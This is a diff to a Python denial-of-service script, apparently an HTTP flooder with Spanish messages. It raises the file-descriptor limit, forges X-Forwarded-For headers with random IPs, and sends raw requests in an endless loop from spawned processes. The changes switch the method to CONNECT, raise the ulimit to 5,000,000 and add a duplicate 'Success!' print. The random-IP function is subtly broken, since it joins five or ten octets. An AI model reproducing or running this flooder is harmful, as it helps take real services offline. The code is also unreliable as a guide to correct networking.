@@ -11,7 +11,7 @@ print("Sistema detectado: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1000000")
+    os.system("ulimit -n 5000000")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -20,7 +20,7 @@ else:
 
 
 def randomip():
-  randip = ".".join(str(random.randint(0, 255)) for _ in range(10))
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(5))
   return randip
 
 
@@ -28,7 +28,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "POC " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "CONNECT " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -56,6 +56,7 @@ def send3attack():
     mp.setDaemon = False
     mp.start() #Magic Starts
     
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     
